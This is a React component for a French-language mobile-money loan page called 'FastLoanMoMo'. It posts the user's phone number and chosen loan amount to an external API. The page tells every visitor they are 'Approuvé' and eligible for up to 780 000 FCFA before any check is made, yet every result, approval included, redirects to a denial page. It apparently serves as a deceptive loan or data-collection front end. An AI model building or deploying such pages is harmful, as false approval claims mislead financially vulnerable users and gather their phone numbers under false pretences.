import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, CheckCircle2 } from "lucide-react";

const API_URL = "https://fastloan-momo.onrender.com";

const LoanLimit = () => {
  const [amount, setAmount] = useState(100000); 
  const [months, setMonths] = useState(6);
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";

  const interestRate = 0.05;
  const interestAmount = amount * interestRate;
  const totalRepayable = amount + interestAmount;
  const monthlyPayment = totalRepayable / months;

  const handleContinue = async () => {
    setIsProcessing(true);
    try {
      const res = await fetch(`${API_URL}/api/apply-loan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phoneNumber, amount, months }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.loan_id) {
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/loan-status/${data.loan_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            setIsProcessing(false);
            
            // ✅ Removed the alert to make the redirect seamless
            if (statusData.status === "approved") {
              navigate("/loan-denied"); // Change to /loan-approved if you build a success page later
            } else {
              navigate("/loan-denied");
            }
          }
        }, 3000);

        // 1 minute timeout
        setTimeout(() => {
          clearInterval(interval);
          setIsProcessing(false);
          navigate("/loan-denied"); 
        }, 60000);
      }
    } catch (error) {
      setIsProcessing(false);
      navigate("/loan-denied");
    }
  };

  const formatFCFA = (val: number) => {
    return val.toLocaleString('fr-FR').replace(/\u202f/g, ' ');
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Prêts mobiles instantanés</p>
      </div>
      
      <div className="main-card">
        <div className="badge"><CheckCircle2 size={14} /> Approuvé</div>
        
        <h2 className="title">Votre limite de prêt</h2>
        <p className="subtitle">Vous êtes éligible jusqu'à <span className="bold">780 000 FCFA</span>. Choisissez le montant.</p>

        <div className="loan-amount-box">
          <p className="loan-label">MONTANT DU PRÊT</p>
          <h1 className="loan-value">{formatFCFA(amount)}</h1>
          <p className="loan-currency">FCFA</p>
        </div>

        <div className="slider-group">
          <div className="slider-header"><span>Montant</span><span style={{ color: '#6B7280' }}>{formatFCFA(amount)} FCFA</span></div>
          <input type="range" min="50000" max="780000" step="10000" value={amount} onChange={(e) => setAmount(Number(e.target.value))} />
          <div className="slider-limits"><span>50 000 FCFA</span><span>780 000 FCFA</span></div>
        </div>

        <div className="slider-group">
          <div className="slider-header"><span>Période</span><span style={{ color: '#6B7280' }}>{months} mois</span></div>
          <input type="range" min="1" max="12" step="1" value={months} onChange={(e) => setMonths(Number(e.target.value))} />
          <div className="slider-limits"><span>1 mois</span><span>12 mois</span></div>
        </div>

        <div className="summary-box">
          <div className="summary-row"><span>Taux d'intérêt</span><span className="bold">5%</span></div>
          <div className="summary-row"><span>Intérêts</span><span className="bold">{formatFCFA(interestAmount)} FCFA</span></div>
          <div className="summary-row"><span>Paiement mensuel</span><span className="bold">{formatFCFA(monthlyPayment)} FCFA</span></div>
          <hr className="summary-divider" />
          <div className="summary-row summary-total"><span style={{ fontWeight: 500 }}>Total à rembourser</span><span className="bold">{formatFCFA(totalRepayable)} FCFA</span></div>
        </div>

        <button onClick={handleContinue} className="btn-primary" style={{ padding: '16px', fontSize: '18px' }}>
          Continuer
        </button>
      </div>

      {isProcessing && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="spinner"></div>
            {/* ✅ UPDATED TEXT HERE */}
            <h3 className="modal-title">Demande soumise</h3>
            <p className="modal-text">
              Votre demande a été soumise avec succès. Veuillez patienter pendant que nous examinons votre demande.
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoanLimit;